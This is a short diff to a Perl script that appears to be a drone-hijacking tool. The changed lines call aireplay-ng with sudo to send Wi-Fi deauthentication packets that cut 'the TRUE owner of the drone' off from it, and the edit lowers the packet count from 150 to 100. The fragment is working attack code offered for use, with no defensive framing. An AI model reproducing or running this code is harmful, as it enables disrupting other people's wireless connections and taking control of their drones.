@@ -53,8 +53,8 @@ sleep(1);
 
 # now, disconnect the TRUE owner of the drone.
 print "Disconnecting the true owner of the drone ;)\n\n";
-my $pid = open(DUMP, "|sudo $aireplay -0 150 -a $drone_mac -c $client_mac $interfaceMon >>/dev/null 2>>/dev/null") || die "Can't run airplay: $!";
-print "Running sudo $aireplay -0 150 -a $drone_mac -c $client_mac $interfaceMon on process $pid";
+my $pid = open(DUMP, "|sudo $aireplay -0 100 -a $drone_mac -c $client_mac $interfaceMon >>/dev/null 2>>/dev/null") || die "Can't run airplay: $!";
+print "Running sudo $aireplay -0 100 -a $drone_mac -c $client_mac $interfaceMon on process $pid";
 #sudo($aireplay, "-0", "5", "-a", $drone_mac, "-c", $client_mac, $interfaceMon);
 #sudo($aireplay, "-0", "5", "-a", $drone_mac, $interfaceMon);
 
